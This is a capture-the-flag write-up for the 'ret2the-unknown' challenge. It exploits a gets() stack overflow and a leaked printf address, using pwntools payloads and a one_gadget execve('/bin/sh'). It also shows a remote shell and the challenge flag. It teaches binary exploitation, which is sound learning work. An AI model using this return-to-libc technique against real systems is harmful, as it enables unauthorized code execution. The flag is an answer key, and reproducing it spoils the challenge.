# ret2the-unknown

## Initial Exploration

We first run `checksec` to see the protections on the binary.

```bash
$ checksec ret2the-unknown
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

[This](https://www.programmersought.com/article/69684755927/) article goes into more details about what these mean, but essentially most of the protections are disabled which makes an exploit easier.

Like the other challenges in this CTF, there is a source file provided.

```c
--snipped--

    char your_reassuring_and_comforting_we_will_arrive_safely_in_libc[32];

--snipped--

    gets(your_reassuring_and_comforting_we_will_arrive_safely_in_libc);

    puts("phew, good to know. shoot! i forgot!");
    printf("rob said i'd need this to get there: %llx\n", printf);
    puts("good luck!");
```

As the name of the challenge suggests, we need to overwrite the return address on the stack to control the program flow. Since `gets` does not restrict the length of our input, we can use it to write onto the stack.

---
## How the stack works

Let's look at how the stack is typically organised as a quick aside. 

```
Low memory address

| Local Variable N | <-- ESP   -┐ 
|       ...        |            |
| Local Variable 2 |            |
| Local Variable 1 |            |
|      Old EBP     | <-- EBP    |- A stack frame
|  Return Address  |            |
|    Argument 1    |            |
|    Argument 2    |            |
|       ...        |            |
|    Argument N    |           -┘

High memory address
```

This stack frame is 'written' to the stack for every function call. The value in `EBP` stays constant within the function call, while the value in `ESP` can change.

With that knowledge, here's how the stack of this program looks like.

```
|     char[32]     | <-- ESP  
|      Old EBP     | <-- EBP 
|  Return Address  | <-- We need to overwrite this
|       ...        |
```

We can verify that by looking at the stack in gdb.

```
0x00007fffffffdcb0│+0x0000: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"   ← $rsp
0x00007fffffffdcb8│+0x0008: "aaaaaaaaaaaaaaaaaaaaaaaa"
0x00007fffffffdcc0│+0x0010: "aaaaaaaaaaaaaaaa"
0x00007fffffffdcc8│+0x0018: "aaaaaaaa"
0x00007fffffffdcd0│+0x0020: 0x0000000000401200  →  <main+122> cmp eax, 0xee3    ← $rbp
0x00007fffffffdcd8│+0x0028: 0x00007ffff7e14d0a  →  <__libc_start_main+234> mov edi, eax
```
---
## Opening a shell
Controlling the program flow is useless if we can't make use of it. To do that, we need to redirect control flow to functions in libc to open a shell.

Here, we use [one_gadget](https://github.com/david942j/one_gadget) in order to find an address in libc to jump to to open a shell. (Note that different versions of libc have different addresses/constraints)

```bash
$ one_gadget libc-2.28.so 
0x4484f execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x448a3 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xe5456 execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL
```

These addresses are the offset from the base of libc, so we need to find that first. Luckily for us, the program already prints the address of `printf`, a known function in libc.

```c
printf("rob said i'd need this to get there: %llx\n", printf);
```

All we have to do is take this address, subtract the offset of `printf`, and add our one_gadget offset to find the address we need to jump to.

---

## Putting it together

Phew, that was a lot but we're almost there! 

A small problem is that the address of `printf` is leaked _after_ we redirect the flow of the program, but no worries, we can always redirect the program back to the start of main! 

Here's what we need to do:

1. Redirect program to run main again
2. Leak address of `printf`
3. Redirect program to jump to our one_gadget

We'll do this using pwntools. The full solution can be found in `solve.py`, but here are the important parts.

```python
loop_payload = b'a' * 32       # Pad char[32] array
loop_payload += p64(0x0)       # Filler rbp value
loop_payload += p64(main_addr) # Loop back to start of main

# some code to parse printf

libc_base = printf_addr - libc.symbols['printf']
one_gadget = libc_base + 0x4484f

payload = b'a' * 32
payload += p64(0x0)
payload += p64(one_gadget)     # Open a shell
```
---
## Remote execution

```bash
$ python solve.py REMOTE

REMOTE PROCESS
[+] Opening connection to mc.ax on port 31568: Done
[*] Printf address: 0x7f494d82d560
[*] Libc base: 0x7f494d7d5000
[*] one_gadget: 0x7f494d81984f
[*] Switching to interactive mode

$ ls
flag.txt
run

$ cat flag.txt
flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housing}
```

`flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housing}`

---
## Extra notes

If a libc library is provided, be sure to patch your binary! This will help save a lot of pain when running locally vs externally.

I... haven't figured out how to do this yet so I'll just leave a [link](https://github.com/skysider/pwndocker) here and maybe update this next time. ¯\\_(ツ)_/¯

